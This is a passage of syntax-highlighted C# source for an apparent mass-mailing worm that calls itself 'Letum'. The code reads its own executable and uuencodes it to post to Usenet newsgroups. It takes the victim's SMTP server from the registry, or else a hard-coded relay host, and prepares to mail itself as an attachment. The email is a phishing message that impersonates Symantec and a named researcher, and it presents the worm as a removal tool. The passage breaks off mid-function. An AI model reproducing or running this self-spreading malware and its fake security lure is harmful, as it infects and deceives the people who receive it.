</span><span class="sc0">                        </span><span class="sc11">num</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nData</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">rsData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nData</span><span class="sc10">[</span><span class="sc11">num</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n\r\n"</span><span class="sc10">;</span><span class="sc0">

                        </span><span class="sc2">// Set itself to read itself
</span><span class="sc0">                        </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">inFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">self</span><span class="sc10">.</span><span class="sc11">ScopeName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">

                        </span><span class="sc2">// Set variable
</span><span class="sc0">                        </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">bs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc11">inFile</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">];</span><span class="sc0">

                        </span><span class="sc2">// Read itself
</span><span class="sc0">                        </span><span class="sc11">inFile</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">bs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">inFile</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">

                        </span><span class="sc2">//Close
</span><span class="sc0">                        </span><span class="sc11">inFile</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

                        </span><span class="sc2">// Encode byte to ASCII
</span><span class="sc0">                        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">uuencode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">ASCII</span><span class="sc10">.</span><span class="sc11">GetString</span><span class="sc10">(</span><span class="sc11">bs</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">uustring</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sBuffer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">uuencode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc10">.</span><span class="sc11">Empty</span><span class="sc10">;</span><span class="sc0">

                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sBuffer</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">trs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">(</span><span class="sc7">' '</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">sBuffer</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">sBuffer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc10">.</span><span class="sc11">Concat</span><span class="sc10">(</span><span class="sc11">sBuffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">trs</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">

                        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sBuffer</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">

                        </span><span class="sc2">// Encode to uuencode
</span><span class="sc0">                        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">str</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc10">.</span><span class="sc11">Concat</span><span class="sc10">(</span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToChar</span><span class="sc10">(</span><span class="sc11">sBuffer</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">)));</span><span class="sc0">
                            </span><span class="sc11">str</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc10">.</span><span class="sc11">Concat</span><span class="sc10">(</span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToChar</span><span class="sc10">(</span><span class="sc11">sBuffer</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToChar</span><span class="sc10">(</span><span class="sc11">sBuffer</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">)));</span><span class="sc0">
                            </span><span class="sc11">str</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc10">.</span><span class="sc11">Concat</span><span class="sc10">(</span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToChar</span><span class="sc10">(</span><span class="sc11">sBuffer</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToChar</span><span class="sc10">(</span><span class="sc11">sBuffer</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">64</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">)));</span><span class="sc0">
                            </span><span class="sc11">str</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc10">.</span><span class="sc11">Concat</span><span class="sc10">(</span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">)((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToChar</span><span class="sc10">(</span><span class="sc11">sBuffer</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">64</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">)));</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">

                        </span><span class="sc2">// Replace all the spaces in the string to `
</span><span class="sc0">                        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">udtf</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">.</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc7">' '</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'`'</span><span class="sc10">);</span><span class="sc0">

                        </span><span class="sc2">// Cut string down to 60 char chunks
</span><span class="sc0">                        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">cursor</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">udtf</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Math</span><span class="sc10">.</span><span class="sc11">Min</span><span class="sc10">(</span><span class="sc4">60</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">udtf</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">cursor</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc2">// Add M to each new line
</span><span class="sc0">                            </span><span class="sc11">fuuencode</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"M"</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc2">// Adds the next 60 chars
</span><span class="sc0">                            </span><span class="sc11">fuuencode</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">udtf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cursor</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc2">// Adds newline
</span><span class="sc0">                            </span><span class="sc11">fuuencode</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">

                            </span><span class="sc11">cursor</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">

                        </span><span class="sc11">uustring</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fuuencode</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">
                        </span><span class="sc2">// Removes the last occurrence of M
</span><span class="sc0">                        </span><span class="sc11">uustring</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">uustring</span><span class="sc10">.</span><span class="sc11">Remove</span><span class="sc10">(</span><span class="sc11">uustring</span><span class="sc10">.</span><span class="sc11">LastIndexOf</span><span class="sc10">(</span><span class="sc6">"M"</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

                        </span><span class="sc2">// Sets up the message to be sent
</span><span class="sc0">                        </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">pData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"FROM: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">pferrie</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\nNEWSGROUPS: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">newsgroup</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\nSUBJECT: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Subject</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n\r\n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">nData</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"begin 644 "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">self</span><span class="sc10">.</span><span class="sc11">ScopeName</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">uustring</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n'\r\nend\r\n."</span><span class="sc10">;</span><span class="sc0">

                        </span><span class="sc2">// Send message
</span><span class="sc0">                        </span><span class="sc11">nWriter</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc11">pData</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">sReply</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">nReader</span><span class="sc10">.</span><span class="sc11">ReadLine</span><span class="sc10">();</span><span class="sc0">

                        </span><span class="sc2">// If it was sent
</span><span class="sc0">                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sReply</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc6">"240"</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">nntp</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">nntp</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">smtp</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// Creates and Initializes
</span><span class="sc0">            </span><span class="sc11">TcpClient</span><span class="sc0"> </span><span class="sc11">smtp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">TcpClient</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">b64String</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc2">// Set variables
</span><span class="sc0">            </span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">smtpServer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">smtpCursor</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">smReply</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">boundary</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"----=_NextPart_81_27_24"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">htmlMsg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body bgcolor=\"white\" text=\"black\" link=\"blue\" vlink=\"purple\" alink=\"red\"&gt;&lt;table border=\"0\" width=\"780\" bgcolor=\"white\"&gt;&lt;tr&gt;&lt;td width=\"154\" valign=\"top\" bgcolor=\"white\"&gt;&lt;p&gt;&amp;nbsp; &lt;table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"&gt;&lt;tr&gt;&lt;td width=\"154\"&gt;&lt;p&gt;&amp;nbsp;&lt;a href=\"http://www.symantec.com\"&gt;"</span><span class="sc0">
                           </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&lt;img src=\"http://www.langtech.com/images/projects/symantec_logoESP.gif\" border=\"0\"&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width=\"154\" background=\"http://security.symantec.com/sscv6/languageContent/ie/sym/images/us.navbar.background.gif\"&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&lt;font face=\"Verdana\" size=\"1\"&gt;&lt;a href=\"http://www.symantec.com/legal/legal_note.html\"&gt;Legal Notices&lt;/a&gt;&lt;/font&gt;&lt;font face=\"Verdana\" size=\"1\"&gt; &lt;br clear=\"all\"&gt;&lt;/font&gt;&lt;font face=\"Verdana\" size=\"1\"&gt;&lt;a href=\"http://www.symantec.com/legal/privacy.html\"&gt;Privacy Policy&lt;/a&gt;&lt;/font&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;&amp;nbsp;&lt;/td&gt;&lt;td width=\"618\" valign=\"top\" bgcolor=\"white\"&gt;&lt;p align=\"left\"&gt;&lt;font face=\"Verdana\" size=\"2\"&gt;&lt;br&gt;&lt;/font&gt;&lt;/p&gt;&lt;p align=\"left\"&gt;&amp;nbsp;&lt;/p&gt;&lt;p align=\"left\"&gt;&amp;nbsp; &lt;div align=\"center\"&gt;&lt;table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"80%\"&gt;&lt;tr&gt;&lt;td width=\"616\"&gt;&lt;p align=\"left\"&gt;&amp;nbsp;&lt;/p&gt;&lt;p align=\"left\"&gt;&lt;font face=\"Verdana\" size=\"2\"&gt;Dear User,&lt;/font&gt;&lt;/p&gt;&lt;p align=\"left\"&gt;&lt;font face=\"Verdana\" size=\"2\"&gt;Due to the high increase of the Letum worm, we have upgraded it to Category B. Please use our attached removal tool to scan and disinfect your computer from the malware.&lt;/font&gt;&lt;/p&gt;&lt;p align=\"left\"&gt;&lt;font face=\"Verdana\" size=\"2\"&gt;If you have any comments or questions about this, then please contact us.&lt;/font&gt;&lt;/p&gt;&lt;p align=\"left\"&gt;&lt;font face=\"Verdana\" size=\"2\"&gt;Regards&lt;/font&gt;&lt;/p&gt;&lt;p align=\"left\"&gt;&lt;font face=\"Verdana\" size=\"2\"&gt;Peter Ferrie&lt;br clear=\"all\"&gt;&lt;/font&gt;&lt;font face=\"Verdana\" size=\"1\"&gt;Senior Anti-Virus Researcher / Senior Principal Software Engineer&amp;nbsp;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;"</span><span class="sc0">
                           </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&lt;p align=\"left\"&gt;&lt;/p&gt;&lt;p align=\"left\"&gt;&lt;div align=\"center\"&gt;&lt;table border=\"0\" cellspacing=\"1\" width=\"100%\"&gt;&lt;tr&gt;&lt;td width=\"100%\" bgcolor=\"white\"&gt;&lt;p align=\"center\"&gt;&lt;font face=\"Verdana\" size=\"1\"&gt;&lt;B&gt;1995 - 2006 Symantec Corporation All rights reserved.&lt;/font&gt;&lt;/td&gt;&lt;/B&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;"</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">// Look in registry for an SMTP server
</span><span class="sc0">            </span><span class="sc11">RegistryKey</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">CurrentUser</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc13">@"Software\Microsoft\Internet Account Manager"</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">// Reads the entries in the key
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">smtpDirs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">.</span><span class="sc11">GetSubKeyNames</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc2">// For each one found do the following ...
</span><span class="sc0">            </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">smtpKey</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">smtpDirs</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">// Opens the Subkey
</span><span class="sc0">                </span><span class="sc11">RegistryKey</span><span class="sc0"> </span><span class="sc11">smtpSubKey</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">CurrentUser</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc13">@"Software\Microsoft\Internet Account Manager\"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">smtpKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc2">// Read the Value for 'NNTP Server'
</span><span class="sc0">                </span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">Server</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">smtpSubKey</span><span class="sc10">.</span><span class="sc11">GetValue</span><span class="sc10">(</span><span class="sc6">"SMTP Server"</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc2">// If the key isnt there
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Server</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">// Hard code our own
</span><span class="sc0">                    </span><span class="sc2">// !SMTP Server Relay Allowed!
</span><span class="sc0">                    </span><span class="sc11">smtpServer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"mail.primaryhost.org.uk"</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc2">// Continue looking just in case
</span><span class="sc0">                    </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">// If key is found then store
</span><span class="sc0">                    </span><span class="sc11">smtpServer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">smtpSubKey</span><span class="sc10">.</span><span class="sc11">GetValue</span><span class="sc10">(</span><span class="sc6">"SMTP Server"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">// Find the path of the new file
</span><span class="sc0">            </span><span class="sc11">key</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">.</span><span class="sc11">CurrentUser</span><span class="sc10">.</span><span class="sc11">OpenSubKey</span><span class="sc10">(</span><span class="sc13">@"Software\Retro"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">HostPath</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">.</span><span class="sc11">GetValue</span><span class="sc10">(</span><span class="sc6">"Letum"</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">// Open file
</span><span class="sc0">            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">FileToB64</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">HostPath</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">bArray</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc11">FileToB64</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc2">// Read file
</span><span class="sc0">            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">rBytes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FileToB64</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">bArray</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">FileToB64</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">// and then close it
</span><span class="sc0">            </span><span class="sc11">FileToB64</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc2">// Convert to Base64
